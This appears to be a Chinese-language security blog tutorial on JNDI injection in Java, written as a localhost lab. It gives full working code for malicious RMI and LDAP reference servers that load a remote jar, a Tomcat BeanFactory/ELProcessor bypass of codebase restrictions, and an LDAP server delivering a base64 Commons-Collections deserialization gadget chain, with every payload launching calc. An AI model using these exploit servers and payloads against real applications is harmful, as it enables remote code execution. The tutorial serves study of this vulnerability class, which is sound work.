## JNDI

`JNDI(Java Naming and Directory Interface)`是Java提供的`Java 命名和目录接口`。通过调用`JNDI`的`API`应用程序可以定位资源和其他程序对象。`JNDI`是`Java EE`的重要部分，需要注意的是它并不只是包含了`DataSource(JDBC 数据源)`，`JNDI`可访问的现有的目录及服务有:`JDBC`、`LDAP`、`RMI`、`DNS`、`NIS`、`CORBA`。

**Naming Service 命名服务：**

命名服务将名称和对象进行关联，提供通过名称找到对象的操作，例如：DNS系统将计算机名和IP地址进行关联、文件系统将文件名和文件句柄进行关联等等。

**Directory Service 目录服务：**

目录服务是命名服务的扩展，除了提供名称和对象的关联，**还允许对象具有属性**。目录服务中的对象称之为目录对象。目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作。

**Reference 引用：**

在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用。引用包含了如何访问实际对象的信息。

## JNDI目录服务

访问`JNDI`目录服务时会通过预先设置好环境变量访问对应的服务， 如果创建`JNDI`上下文(`Context`)时未指定`环境变量`对象，`JNDI`会自动搜索`系统属性(System.getProperty())`、`applet 参数`和`应用程序资源文件(jndi.properties)`。

JNDI通过我们所设置的工厂类来确定我们使用的是何种服务，即我们在初始化上下文所指定的类

```java
        //设置环境变量
        Hashtable env = new Hashtable();
        env.put(Context.PROVIDER_URL,"rmi://127.0.0.1:9527");
        env.put(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.rmi.registry.RegistryContextFactory");
        //初始化上下文
        Context initialContext = new InitialContext(env);
```

`com.sun.jndi.rmi.registry.RegistryContextFactory`为rmi服务的工厂类

### 通过context与服务进行交互

```java
//将名称绑定到对象
bind(Name name, Object obj) 
//枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名
list(String name) 
//检索命名对象
lookup(String name)
//将名称重绑定到对象 
rebind(String name, Object obj) 
//取消绑定命名对象
unbind(String name) 
```

这点和rmi一样

### JNDI-RMI

启动一个rmi服务

```JAVA
package JNDI.example;

import java.net.MalformedURLException;
import java.rmi.AlreadyBoundException;
import java.rmi.Naming;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.server.UnicastRemoteObject;

public class rmiserver {
    // RMI服务器IP地址
    public static final String RMI_HOST = "127.0.0.1";
    // RMI服务端口
    public static final int RMI_PORT = 9527;
    // RMI服务名称
    public static final String RMI_NAME = "rmi://" + RMI_HOST + ":" + RMI_PORT + "/hello";

    public class RMIHello extends UnicastRemoteObject implements Hello {

        private static final long serialVersionUID = 1L;

        protected RMIHello() throws RemoteException {
            super();
        }
        @Override
        public String sayHello(String name) throws RemoteException {
            return "Hello RMI~";
        }

    }
    public void registery() throws RemoteException, MalformedURLException, AlreadyBoundException {
        // 注册RMI端口
        LocateRegistry.createRegistry(RMI_PORT);
        RMIHello rmiHello = new RMIHello();
        // 绑定Remote对象
        Naming.bind(RMI_NAME,rmiHello);
        System.out.println("RMI服务启动成功,服务地址:" + RMI_NAME);
    }

    public static void main(String[] args) throws MalformedURLException, AlreadyBoundException, RemoteException {
        new rmiserver().registery();
    }

}

```

通过JNDI接口远程调用类

```java
package JNDI.example;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.rmi.RemoteException;
import java.util.Hashtable;

public class JNDI_RMI {
    public static  void main(String args[]) throws NamingException, RemoteException {
        //设置环境变量
        Hashtable env = new Hashtable();
        env.put(Context.PROVIDER_URL,"rmi://127.0.0.1:9527");
        env.put(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.rmi.registry.RegistryContextFactory");
        //初始化上下文
        Context initialContext = new InitialContext(env);
        // 通过命名服务查找远程RMI绑定的Hello对象
        Hello hello = (Hello)initialContext.lookup("hello");
        System.out.println(hello.sayHello("uu2fu3o"));

    }

}

```

![image-20240616195446994](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240616195446994.png)

### JNDI_DNS

```java
package JNDI.example;

import javax.naming.Context;
import javax.naming.NamingException;
import javax.naming.directory.Attributes;
import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;
import java.util.Hashtable;

public class JNDI_DNS {
    public static void main(String[] args) {
        Hashtable<String,String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.dns.DnsContextFactory");
        env.put(Context.PROVIDER_URL, "dns://127.0.0.1");

        try {
            DirContext ctx = new InitialDirContext(env);
            Attributes res = ctx.getAttributes("baidu.com", new String[] {"A"});
            System.out.println(res);
        } catch (NamingException e) {
            e.printStackTrace();
        }

    }
}
```

## JNDI动态协议转换

如果`JNDI`在`lookup`时没有指定初始化工厂名称，会自动根据协议类型动态查找内置的工厂类然后创建处理对应的服务请求。

`JNDI`默认支持自动转换的协议有：

| 协议名称             | 协议URL        | Context类                                               |
| -------------------- | -------------- | ------------------------------------------------------- |
| DNS协议              | `dns://`       | `com.sun.jndi.url.dns.dnsURLContext`                    |
| RMI协议              | `rmi://`       | `com.sun.jndi.url.rmi.rmiURLContext`                    |
| LDAP协议             | `ldap://`      | `com.sun.jndi.url.ldap.ldapURLContext`                  |
| LDAP协议             | `ldaps://`     | `com.sun.jndi.url.ldaps.ldapsURLContextFactory`         |
| IIOP对象请求代理协议 | `iiop://`      | `com.sun.jndi.url.iiop.iiopURLContext`                  |
| IIOP对象请求代理协议 | `iiopname://`  | `com.sun.jndi.url.iiopname.iiopnameURLContextFactory`   |
| IIOP对象请求代理协议 | `corbaname://` | `com.sun.jndi.url.corbaname.corbanameURLContextFactory` |

```java
        Context initialContext = new InitialContext(env);
        // 通过命名服务查找远程RMI绑定的Hello对象
        Hello hello = (Hello)initialContext.lookup("rmi://127.0.0.1:9527/hello");
        System.out.println(hello.sayHello("uu2fu3o"));
```

例如上直接初始化context，`lookup`会自动使用`rmiURLContext`处理`RMI`请求

这里就存在注入问题，虽然使用字符串直接指定会很方便，但如果我们能直接控制该字符串，就有可能造成远程的类加载，执行恶意命令

## JNDI-Reference

在`JNDI`服务中允许使用系统以外的对象，比如在某些目录服务中直接引用远程的Java对象，但遵循一些安全限制。

通常reference的构造函数如下

```java
//className为远程加载时所使用的类名，如果本地找不到这个类名，就去远程加载
//factory为工厂类名
//factoryLocation为工厂类加载的地址，可以是file://、ftp://、http:// 等协议
Reference(String className,  String factory, String factoryLocation) 
```

### RMI/LDAP远程对象引用安全限制

在`RMI`服务中引用远程对象将受本地Java环境限制即本地的`java.rmi.server.useCodebaseOnly`配置必须为`false(允许加载远程对象)`，如果该值为`true`则禁止引用远程对象。除此之外被引用的`ObjectFactory`对象还将受到`com.sun.jndi.rmi.object.trustURLCodebase`配置限制，如果该值为`false(不信任远程引用对象)`一样无法调用远程的引用对象。

本地测试远程对象引用可以使用如下方式允许加载远程的引用对象：

```java
System.setProperty("java.rmi.server.useCodebaseOnly", "false");
System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
```

### JNDI-RMI

这个就是我们要远程调用的类

```java
package JNDI.example;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import java.util.Hashtable;

public class reference_rmi extends UnicastRemoteObject implements ObjectFactory {

    public reference_rmi() throws RemoteException {
        super();
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public void sayhello() throws IOException {
        Runtime.getRuntime().exec("calc");
    }


    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return null;
    }
}

```

这个类需要继承ObjectFactory，并重写getObjectInstance方法

接下来创建一个恶意的rmi服务

```java
package JNDI.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.net.MalformedURLException;
import java.rmi.AlreadyBoundException;
import java.rmi.Naming;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;

public class rmi_reference_server {
    public static final String RMI_HOST = "127.0.0.1";
    // RMI服务端口
    public static final int RMI_PORT = 9527;
    // RMI服务名称
    public static final String RMI_NAME = "rmi://" + RMI_HOST + ":" + RMI_PORT + "/hello";
    public void register() throws RemoteException, NamingException, MalformedURLException, AlreadyBoundException {
        LocateRegistry.createRegistry(RMI_PORT);
        Reference reference = new Reference("sayhello","reference_rmi","http://localhost/cc.jar");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(reference);
        Naming.bind(RMI_NAME,refObjWrapper);
        System.out.println("启动成功"+RMI_NAME);
    }
    public static void main(String args[]) throws MalformedURLException, AlreadyBoundException, NamingException, RemoteException {
        new rmi_reference_server().register();
    }

}

```

通过reference加载我们服务器上的jar包，该包中包含了我们装入的恶意类

模拟客户端rmi_client.java

```java
package JNDI.example;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class rmi_client {
    public static  void main(String args[]) throws NamingException {
        String name = "rmi://127.0.0.1:9527/hello";
        InitialContext ctx = new InitialContext();
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        Object obj = ctx.lookup(name);
        System.out.println(obj);
    }
}

```

高版本需要自己设置允许访问

![image-20240617230356692](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240617230356692.png)

### JNDI-LDAP

添加依赖

```java
<dependency>
    <groupId>com.unboundid</groupId>
    <artifactId>unboundid-ldapsdk</artifactId>
    <version>3.1.1</version>
    <scope>test</scope>
</dependency>
```

ldap服务不再多介绍，看示例代码，[来源于](https://www.javasec.org/javase/JNDI/#jndi-reference)

```java
package JNDI.example;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

public class LDAPReferenceServerTest {

    // 设置LDAP服务端口
    public static final int SERVER_PORT = 9999;

    // 设置LDAP绑定的服务地址，外网测试换成0.0.0.0
    public static final String BIND_HOST = "127.0.0.1";

    // 设置一个实体名称
    public static final String LDAP_ENTRY_NAME = "test";

    // 获取LDAP服务地址
    public static String LDAP_URL = "ldap://" + BIND_HOST + ":" + SERVER_PORT + "/" + LDAP_ENTRY_NAME;

    // 定义一个远程的jar，jar中包含一个恶意攻击的对象的工厂类
    public static final String REMOTE_REFERENCE_JAR = "http://localhost/cc.jar";

    // 设置LDAP基底DN
    private static final String LDAP_BASE = "dc=test,dc=org";

    public static void main(String[] args) {
        try {
            // 创建LDAP配置对象
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);

            // 设置LDAP监听配置信息
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", InetAddress.getByName(BIND_HOST), SERVER_PORT,
                    ServerSocketFactory.getDefault(), SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault())
            );

            // 添加自定义的LDAP操作拦截器
            config.addInMemoryOperationInterceptor(new OperationInterceptor());

            // 创建LDAP服务对象
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);

            // 启动服务
            ds.startListening();

            System.out.println("LDAP服务启动成功,服务地址：" + LDAP_URL);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base  = result.getRequest().getBaseDN();
            Entry  entry = new Entry(base);

            try {
                // 设置对象的工厂类名
                String className = "JNDI.example.reference_rmi";
                entry.addAttribute("javaClassName", className);
                entry.addAttribute("javaFactory", className);

                // 设置远程的恶意引用对象的jar地址
                entry.addAttribute("javaCodeBase", REMOTE_REFERENCE_JAR);

                // 设置LDAP objectClass
                entry.addAttribute("objectClass", "javaNamingReference");

                result.sendSearchEntry(entry);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            } catch (Exception e1) {
                e1.printStackTrace();
            }
        }

    }

}
```

ldap客户端

```java
package JNDI.example;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class LDAPReferenceClientTest {
    public static void main(String[] args) {
        try {
//       // 测试时如果需要允许调用RMI远程引用对象加载请取消如下注释
//       System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");

            Context ctx = new InitialContext();

            // 获取RMI绑定的恶意ReferenceWrapper对象
            Object obj = ctx.lookup("ldap://127.0.0.1:9999/test");

            System.out.println(obj);
        } catch (NamingException e) {
            e.printStackTrace();
        }
    }
}

```

运行该客户端文件即可加载恶意远程类

![image-20240617234135638](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240617234135638.png)

## JNDI高版本限制

高版本的限制，即在上文代码提到的两个设置参数

```java
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
```

利用Codebase攻击RMI服务的时候,如果想要根据Codebase加载位于远端服务器的类时，`java.rmi.server.useCodebaseOnly`的值必须为`false`

`com.sun.jndi.cosnaming.object.trustURLCodebase` 的默认值变为了`false`，即默认不允许通过RMI从远程的`Codebase`加载`Reference`工厂类

### 利用本地factory进行绕过

[JNDI限制绕过](https://paper.seebug.org/942/)

在tomcat8中存在的类`org.apache.naming.factory.BeanFactory`

它的getObjectInstance方法会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。

依赖

```xml
        <dependency>
            <groupId>org.apache.tomcat</groupId>
            <artifactId>tomcat-catalina</artifactId>
            <version>8.5.0</version>
        </dependency>
        <dependency>
            <groupId>org.lucee</groupId>
            <artifactId>javax.el</artifactId>
            <version>3.0.0</version>
        </dependency>
```

```java
package JNDI.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.StringRefAddr;
import java.net.MalformedURLException;
import java.rmi.AlreadyBoundException;
import java.rmi.Naming;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;

public class rmi_reference_server {
    public static final String RMI_HOST = "127.0.0.1";
    // RMI服务端口
    public static final int RMI_PORT = 9527;
    // RMI服务名称
    public static final String RMI_NAME = "rmi://" + RMI_HOST + ":" + RMI_PORT + "/hello";
    public void register() throws RemoteException, NamingException, MalformedURLException, AlreadyBoundException {
        LocateRegistry.createRegistry(RMI_PORT);

//        Reference reference = new Reference("sayhello","reference_rmi","http://localhost/cc.jar");
//        ReferenceWrapper refObjWrapper = new ReferenceWrapper(reference);
        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null);
        resourceRef.add(new StringRefAddr("forceString", "uu2=eval"));
        resourceRef.add(new StringRefAddr("uu2", "Runtime.getRuntime().exec(\"calc\")"));
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);
        Naming.bind(RMI_NAME,referenceWrapper);
        System.out.println("启动成功"+RMI_NAME);
    }
    public static void main(String args[]) throws MalformedURLException, AlreadyBoundException, NamingException, RemoteException {
        new rmi_reference_server().register();
    }

}

```

客户端

```java
package JNDI.example;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class rmi_client {
    public static  void main(String args[]) throws NamingException {
        String name = "rmi://127.0.0.1:9527/hello";
        InitialContext ctx = new InitialContext();
//        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
//        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        Object obj = ctx.lookup(name);
        System.out.println(obj);
    }
}

```

### 本地反序列化

在LDAP中，Java有多种方式进行数据存储

- 序列化数据
- JNDI Reference
- Marshalled Object
- Remote Location

同时LDAP也可以为存储的对象指定多种属性

- javaCodeBase
- objectClass
- javaFactory
- javaSerializedData

如果LDAP存储的某个对象的`javaSerializedData`值不为空，则客户端会通过调用`obj.decodeObject()`对该属性值内容进行反序列化。如果客户端存在反序列化相关组件漏洞，则我们可以通过LDAP来传输恶意序列化对象。

```java
package JNDI.example;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.util.Base64;

public class LDAPReferenceServerTest {

    // 设置LDAP服务端口
    public static final int SERVER_PORT = 9999;

    // 设置LDAP绑定的服务地址，外网测试换成0.0.0.0
    public static final String BIND_HOST = "127.0.0.1";

    // 设置一个实体名称
    public static final String LDAP_ENTRY_NAME = "test";

    // 获取LDAP服务地址
    public static String LDAP_URL = "ldap://" + BIND_HOST + ":" + SERVER_PORT + "/" + LDAP_ENTRY_NAME;

    // 定义一个远程的jar，jar中包含一个恶意攻击的对象的工厂类
//    public static final String REMOTE_REFERENCE_JAR = "http://localhost/CC.jar";

    // 设置LDAP基底DN
    private static final String LDAP_BASE = "dc=test,dc=org";

    public static void main(String[] args) {
        try {
            // 创建LDAP配置对象
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);

            // 设置LDAP监听配置信息
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", InetAddress.getByName(BIND_HOST), SERVER_PORT,
                    ServerSocketFactory.getDefault(), SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault())
            );

            // 添加自定义的LDAP操作拦截器
            config.addInMemoryOperationInterceptor(new OperationInterceptor());

            // 创建LDAP服务对象
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);

            // 启动服务
            ds.startListening();

            System.out.println("LDAP服务启动成功,服务地址：" + LDAP_URL);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base  = result.getRequest().getBaseDN();
            Entry  entry = new Entry(base);

            try {
//                // 设置对象的工厂类名
//                String className = "JNDI.example.reference_rmi";
//                entry.addAttribute("javaClassName", className);
//                entry.addAttribute("javaFactory", className);
//
//                // 设置远程的恶意引用对象的jar地址
//                entry.addAttribute("javaCodeBase", REMOTE_REFERENCE_JAR);
                entry.addAttribute("javaClassName", "foo");
                entry.addAttribute("javaSerializedData", Base64.getDecoder().decode(
                        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADYWJjc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAEc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXB0AAlnZXRNZXRob2R1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ABxzcQB+ABN1cQB+ABgAAAACcHB0AAZpbnZva2V1cQB+ABwAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAYc3EAfgATdXEAfgAYAAAAAXQABGNhbGN0AARleGVjdXEAfgAcAAAAAXEAfgAfc3EAfgAAP0AAAAAAAAx3CAAAABAAAAAAeHh0AANlZWV4"
                ));
                result.sendSearchEntry(entry);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            } catch (Exception e1) {
                e1.printStackTrace();
            }
        }

    }

}
```

```java
package JNDI.example;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class LDAPReferenceClientTest {
    public static void main(String[] args) {
        try {
//       // 测试时如果需要允许调用RMI远程引用对象加载请取消如下注释
//       System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");

            Context ctx = new InitialContext();

            // 获取RMI绑定的恶意ReferenceWrapper对象
            Object obj = ctx.lookup("ldap://127.0.0.1:9999/test");

            System.out.println(obj);
        } catch (NamingException e) {
            e.printStackTrace();
        }
    }
}

```

该绕过需要受害者本地有CC依赖，用于触发反序列化

![image-20240618145606623](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240618145606623.png)